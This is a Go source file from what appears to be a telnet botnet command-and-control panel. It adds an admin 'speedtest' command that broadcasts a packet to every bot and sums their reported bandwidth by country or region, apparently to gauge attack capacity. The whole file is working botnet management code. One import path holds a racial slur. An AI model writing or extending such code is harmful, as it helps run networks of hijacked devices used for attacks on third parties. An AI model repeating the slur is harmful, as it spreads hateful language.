package admin

import (
	"advanced-telnet-cnc/source/master/command"
	sessions "advanced-telnet-cnc/source/master/session"
	"advanced-telnet-cnc/source/master/termfx"
	slave "advanced-telnet-cnc/source/niggers/v2"
	"encoding/binary"
	"fmt"
	"sort"
	"strings"
)

func init() {
	command.Make(&command.Command{
		Aliases:     []string{"speedtest", "st"},
		Description: "Triggers a speedtest on all bots or displays the last results.",
		Usage:       []command.Argument{{Name: "run | view", Optional: true}},
		Admin:       true,
		Executor: func(args []string, fx *termfx.TermFX, session *sessions.Session) error {
			if len(args) == 0 || args[0] == "run" {
				// Construct speedtest packet: \xFC (ID) + \x00\x00 (Time) + \x00 (Targets) + \x00 (Options)
				payload := []byte{0xFC, 0x00, 0x00, 0x00, 0x00}
				buf := make([]byte, 2+len(payload))
				binary.BigEndian.PutUint16(buf[0:2], uint16(len(payload)))
				copy(buf[2:], payload)

				slave.Slave.Broadcast(buf, "", "", -1)
				session.Println("Speedtest command queued to all bots.")
				return nil
			}

			if len(args) > 0 && args[0] == "view" {
				mode := "total"
				if len(args) > 1 {
					if strings.EqualFold(args[1], "region") {
						mode = "region"
					} else if strings.EqualFold(args[1], "country") {
						mode = "country"
					}
				}

				type agg struct {
					name  string
					speed float64
				}
				data := make(map[string]float64)

				addBot := func(country, region string, st string) {
					if st == "" {
						return
					}
					var speed float64
					fmt.Sscanf(st, "%f", &speed)

					group := country
					if mode == "region" {
						group = region
					}
					data[group] += speed
				}

				slave.Slave.Mutex.RLock()
				for _, bot := range slave.Slave.Bots {
					addBot(bot.Country, bot.Region, bot.Speedtest)
				}
				slave.Slave.Mutex.RUnlock()

				if len(data) == 0 {
					session.Println("No speedtest results found yet.")
					return nil
				}

				var results []agg
				var grandTotal float64
				for n, s := range data {
					results = append(results, agg{n, s})
					grandTotal += s
				}

				// Sort descending by speed
				sort.Slice(results, func(i, j int) bool {
					return results[i].speed > results[j].speed
				})

				session.Printf("Speedtest Results by %s:\r\n", mode)
				session.Println("----------------------------------------")
				for _, r := range results {
					session.Printf("%-20s: %s\r\n", r.name, formatSpeed(r.speed))
				}
				session.Println("----------------------------------------")
				session.Printf("%-20s: %s\r\n", "GRAND TOTAL", formatSpeed(grandTotal))
				return nil
			}

			return command.ErrNotEnoughArguments
		},
	})
}

func formatSpeed(mbps float64) string {
	if mbps >= 1024*1024 {
		return fmt.Sprintf("%.2f Tbps", mbps/(1024*1024))
	} else if mbps >= 1024 {
		return fmt.Sprintf("%.2f Gbps", mbps/1024)
	} else {
		return fmt.Sprintf("%.2f Mbps", mbps)
	}
}
